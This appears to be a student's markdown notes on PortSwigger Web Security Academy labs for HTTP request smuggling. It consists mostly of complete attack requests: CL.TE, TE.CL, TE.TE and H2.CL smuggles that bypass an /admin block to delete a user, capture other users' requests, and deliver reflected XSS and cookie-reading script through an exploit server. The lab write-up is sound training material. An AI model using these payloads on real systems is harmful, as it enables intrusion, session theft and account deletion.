### How it works

<img width="514" alt="image" src="https://user-images.githubusercontent.com/56427824/195548808-cb03ec10-61ee-4a48-a310-812993844477.png">

- Content Length VERY IMPORTANT

- Lenghts of your chunks VERY IMPORTANT

- `\r\n` very important (single empty lines)

- `\r\n\r\n` very important (double empty lines)

- If not sure, always add more lines (if possible) and account for it when setting content lengthA

### HTTP request smuggling, basic CL.TE vulnerability

<img width="644" alt="image" src="https://user-images.githubusercontent.com/56427824/195522701-9c44c82b-73c2-4bba-9dc8-e2aa524bede6.png">

- Content Length = 13, start counting from 0

  <img width="173" alt="image" src="https://user-images.githubusercontent.com/56427824/195522951-b97eae00-1828-4287-aef4-1879bf94292d.png">

https://forum.portswigger.net/thread/disable-automatic-update-of-content-length-in-intruder-and-turbo-intruder-18ac2dad

https://portswigger.net/burp/documentation/desktop/tools/repeater/options

Body of the current request must be 0

The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

The front-end server processes the Content-Length header and determines that the request body is X bytes long, up to the end of SMUGGLED. This request is forwarded on to the back-end server.

The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

```
POST /post/comment HTTP/1.1
Host: 0a480093035f12dcc04d11bd00e7008d.web-security-academy.net
Cookie: session=zka8KHc2xIjR4lhZb9Us074SujxbdfWF
Content-Length: 118 # can change
Transfer-Encoding: chunked
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a480093035f12dcc04d11bd00e7008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a480093035f12dcc04d11bd00e7008d.web-security-academy.net/post?postId=3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
                                     
0

GPOST /post/comment HTTP/1.1

csrf=ZCSVB7nSo5MyKE8jiWlQTC9hoqPtSYY0&postId=3&comment=asd&name=asd&email=asd%40asd.cm&website=https%3A%2F%2Fasd.com

```

- Frontend processes the first 118 bytes from 0 as the message body

  ```
  0

  GPOST /post/comment HTTP/1.1

  csrf=ZCSVB7nSo5MyKE8jiWlQTC9hoqPtSYY0&postId=3&comment=asd&name=asd&email=asd%40asd.cm&website=https%3A%2F%2Fasd.com
  ```

- Backend processes the message body as chunks

  1. Message body starts of with 0 which is a terminator, hence chunk ends

    - https://en.wikipedia.org/wiki/Chunked_transfer_encoding

    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding#

  2. Moves on to the second part of the message body, backend interprets the next chunk as a request

  3. Prepends next request with the next chunk

    ```
    GPOST /post/comment HTTP/1.1

    csrf=ZCSVB7nSo5MyKE8jiWlQTC9hoqPtSYY0&postId=3&comment=asd&name=asd&email=asd%40asd.cm&website=https%3A%2F%2Fasd.com
    ```

### HTTP request smuggling, basic TE.CL vulnerability

```
POST /post/comment HTTP/1.1
Host: 0ab1008e04dc7154c030e582005f00a8.web-security-academy.net
Cookie: session=pPd4pXO2E5cenmSNs56iE4ga8PDN0lWO
Content-Length: 4
Transfer-Encoding: chunked
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ab1008e04dc7154c030e582005f00a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab1008e04dc7154c030e582005f00a8.web-security-academy.net/post?postId=4
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

1E
GPOST /post/comment HTTP/1.1

0


```

- You need to include the trailing sequence \r\n\r\n following the final 0.

- Frontend processes the message body in chunks, first chunk is 0x1E characters long

  <img width="175" alt="image" src="https://user-images.githubusercontent.com/56427824/195567616-d468e7fd-b644-4f5d-abd8-873d21876c8f.png">
  
  Between 1E and 0 (exclude 1E and 0)

  1. Content-Length = 4, hence read until 1E (0x1E is 30 in decimal)

      https://www.rapidtables.com/convert/number/decimal-to-hex.html

      <img width="174" alt="image" src="https://user-images.githubusercontent.com/56427824/195537969-ae189a71-a4a0-4ba3-8e7d-12dd97682cc8.png">
      
      ```
      GPOST /post/comment HTTP/1.1
      
      ```

  2. Moves on to the second part of the message body, backend interprets the next chunk as a request, but it is a 0. Hence terminate
      
      ```
      0


      ```

- Backend processes the following from the frontend

  ```
  1E
  GPOST /post/comment HTTP/1.1

  0


  ```

  1. 1E\r\n is 4 bytes which is the content length of the request

  2. Backend then interprets `GPOST /post/comment HTTP/1.1` as a new request
  
### HTTP request smuggling, basic TE.TE vulnerability (obfuscating the TE header)

https://brightsec.com/blog/http-request-smuggling-hrs/

```
POST /post/comment HTTP/1.1
Host: 0a8f003f0461e769c1135c5a0032004a.web-security-academy.net
Cookie: session=s97rB8eREWI7Ydhn0BDlTaTBsTB1ZY0d
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a8f003f0461e769c1135c5a0032004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8f003f0461e769c1135c5a0032004a.web-security-academy.net/post?postId=7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

1E
GPOST /post/comment HTTP/1.1

0


```

- You need to include the trailing sequence \r\n\r\n following the final 0.

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

<img width="638" alt="image" src="https://user-images.githubusercontent.com/56427824/195546066-43233caa-61d9-4c76-a8c2-323a69d7a294.png">

<img width="634" alt="image" src="https://user-images.githubusercontent.com/56427824/195546165-d99c1a2f-2ff3-45bd-8788-5df8a5537f32.png">

Confirm CL:TE Vulnerability

```
POST /post/comment HTTP/1.1
Host: 0a6700fe03cbc79ec068303c00bf0039.web-security-academy.net
Cookie: session=xVphi9K1cd1EaPsHzoH9zfFbmztwWa8u
Transfer-Encoding: chunked
Content-Length: 4
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6700fe03cbc79ec068303c00bf0039.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6700fe03cbc79ec068303c00bf0039.web-security-academy.net/post?postId=9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

1
A
X
```

- TE:CL timing attack should fail

<img width="516" alt="image" src="https://user-images.githubusercontent.com/56427824/195548230-a3364f8f-9548-496f-b9b4-d16693d9fe1a.png">

- ```
  GET /404 HTTP/1.1
  Foo: x
  ```
  
    1. This segment of the request is pre=peneded to the NEXT request the server receives

- Answer

  ```
  POST / HTTP/1.1
  Host: 0a6700fe03cbc79ec068303c00bf0039.web-security-academy.net
  Cookie: session=xVphi9K1cd1EaPsHzoH9zfFbmztwWa8u
  Transfer-Encoding: chunked
  Content-Length: 49
  Cache-Control: max-age=0
  Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
  Sec-Ch-Ua-Mobile: ?0
  Sec-Ch-Ua-Platform: "Windows"
  Upgrade-Insecure-Requests: 1
  Origin: https://0a6700fe03cbc79ec068303c00bf0039.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Sec-Fetch-Site: same-origin
  Sec-Fetch-Mode: navigate
  Sec-Fetch-User: ?1
  Sec-Fetch-Dest: document
  Referer: https://0a6700fe03cbc79ec068303c00bf0039.web-security-academy.net/post?postId=9
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
  Connection: close

  e
  q=smuggling&x=
  0

  GET /404 HTTP/1.1
  Foo: x
  ```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

<img width="597" alt="image" src="https://user-images.githubusercontent.com/56427824/195559100-fff58d2e-bd94-4620-8a8e-5049db6455e4.png">

```
POST / HTTP/1.1
Host: 0ae1004004f6309bc0cf1cb100b50096.web-security-academy.net
Cookie: session=80YpPSfgNZ76O5dC5bZWIWcE2PCpDkKf
Content-Length: 4
Transfer-Encoding: chunked
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ae1004004f6309bc0cf1cb100b50096.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae1004004f6309bc0cf1cb100b50096.web-security-academy.net/post?postId=9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

13
GET /404 HTTP/1.1

0


```

- 13 is 0x13, 19 in decimals

- Everything ABOVE the 0 line (exclude 0 line)

If you want to use POST, need to have content body and stuff:

```
POST / HTTP/1.1
Host: 0ae1004004f6309bc0cf1cb100b50096.web-security-academy.net
Cookie: session=80YpPSfgNZ76O5dC5bZWIWcE2PCpDkKf
Content-Length: 4
Transfer-Encoding: chunked
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ae1004004f6309bc0cf1cb100b50096.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae1004004f6309bc0cf1cb100b50096.web-security-academy.net/post?postId=9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

- Smuggled GET cannot have body while POST must have body

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

Accessing `/admin`, we get: "Path /admin is blocked"

```
POST / HTTP/1.1
Host: 0a6600530437fdfcc086273c00780093.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 28
Transfer-Encoding: chunked
Connection: close

0

GET /admin HTTP/1.1


```

- Admin interface only available to local users

Bypass:

```
POST / HTTP/1.1
Host: 0a6600530437fdfcc086273c00780093.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 53
Transfer-Encoding: chunked
Connection: close

0

GET /admin HTTP/1.1
Host: localhost
Foo: x


```

Answer:

```
POST / HTTP/1.1
Host: 0a6600530437fdfcc086273c00780093.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 76
Transfer-Encoding: chunked
Connection: close

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Foo: x


```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability


```
POST / HTTP/1.1
Host: 0a51001e036ec66dc008318400cd001d.web-security-academy.net
Cookie: session=zdaG2SWrUcaDv6FrTbj7CXsnLRJ2yjdN
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 4
Transfer-Encoding: chunked
Connection: close

15
GET /admin HTTP/1.1

0


```

```
POST / HTTP/1.1
Host: 0a51001e036ec66dc008318400cd001d.web-security-academy.net
Cookie: session=zdaG2SWrUcaDv6FrTbj7CXsnLRJ2yjdN
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 4
Transfer-Encoding: chunked
Connection: close

2E
GET /admin HTTP/1.1
Host: localhost
Foo: x

0


```

```
POST / HTTP/1.1
Host: 0a51001e036ec66dc008318400cd001d.web-security-academy.net
Cookie: session=zdaG2SWrUcaDv6FrTbj7CXsnLRJ2yjdN
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 4
Transfer-Encoding: chunked
Connection: close

45
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Foo: x

0


```

### Exploiting HTTP request smuggling to reveal front-end request rewriting

```
POST / HTTP/1.1
Host: 0ac30098036b8604c0c2483400490034.web-security-academy.net
Cookie: session=tI9xKyfdWLbk7tv6skkxIYsEZMpzDrBZ
Content-Length: 124
Transfer-Encoding: chunked
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ac30098036b8604c0c2483400490034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac30098036b8604c0c2483400490034.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test


```


```
POST / HTTP/1.1
Host: 0ac30098036b8604c0c2483400490034.web-security-academy.net
Cookie: session=tI9xKyfdWLbk7tv6skkxIYsEZMpzDrBZ
Content-Length: 121
Transfer-Encoding: chunked
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

0

GET /admin HTTP/1.1
X-crOMsO-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1


```

```
POST / HTTP/1.1
Host: 0ac30098036b8604c0c2483400490034.web-security-academy.net
Cookie: session=tI9xKyfdWLbk7tv6skkxIYsEZMpzDrBZ
Content-Length: 144
Transfer-Encoding: chunked
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

0

GET /admin/delete?username=carlos HTTP/1.1
X-crOMsO-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1


```

### Exploiting HTTP request smuggling to capture other users' requests

Need to set content length of smuggled request to an appropriate value as that will determine how long the smuggled `/post/comment` request is and how much the comment attribute will capture

After sending the exploit, do not immediately attempt to access the web application as we want the victim to trigger our smuggled HTTP request and not ourself

```
POST / HTTP/1.1
Host: 0a13000003491c06c03209bf00b300f2.web-security-academy.net
Cookie: session=1BahIc3mvaIbwizp3NRi3V1a1taYhsDd
Cache-Control: max-age=0
Transfer-Encoding: chunked
Content-Length: 1119
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

0

POST /post/comment HTTP/1.1
Host: 0a13000003491c06c03209bf00b300f2.web-security-academy.net
Cookie: session=1BahIc3mvaIbwizp3NRi3V1a1taYhsDd
Content-Length: 800
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a13000003491c06c03209bf00b300f2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a13000003491c06c03209bf00b300f2.web-security-academy.net/post?postId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=g8m1NmcSHiEC261Gl5FwzoxWZkwwhNaR&postId=2&name=asd&email=asd%40asd.cm&website=https%3A%2F%2Fasd.com&comment=asd







```

### Exploiting HTTP request smuggling to deliver reflected XSS

```
GET /post?postId=8 HTTP/1.1
Host: 0a08006c032db502c0df027c00590030.web-security-academy.net
Cookie: session=WWSaYlwePH4piCrMlfarZzBo64qRE6cW
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


```

```
<input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36">
```

Answer:

```
POST / HTTP/1.1
Host: 0a08006c032db502c0df027c00590030.web-security-academy.net
Cookie: session=WWSaYlwePH4piCrMlfarZzBo64qRE6cW
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 784
Transfer-Encoding: chunked

0

GET /post?postId=8 HTTP/1.1
Host: 0a08006c032db502c0df027c00590030.web-security-academy.net
Cookie: session=WWSaYlwePH4piCrMlfarZzBo64qRE6cW
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"><script>alert(1)</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close




```

### H2.CL request smuggling

`/resources` redirects to `/resources/`

<img width="814" alt="image" src="https://user-images.githubusercontent.com/56427824/197118837-56de741e-c458-45a7-9797-0d037e3c47d0.png">

```
POST / HTTP/2
Host: 0a3400d10387e80dc00605c9009000cb.web-security-academy.net
Cookie: session=YtKxwMFcLomg9f6hOwGDxjaUhNWvsvif
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0a5d0086037fe8fec01d0560015f00f5.exploit-server.net
Content-Length: 5

x=1

```

Edit header and ensure that content type is html

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
```

```
<script>
alert(document.cookie)
</script>
```



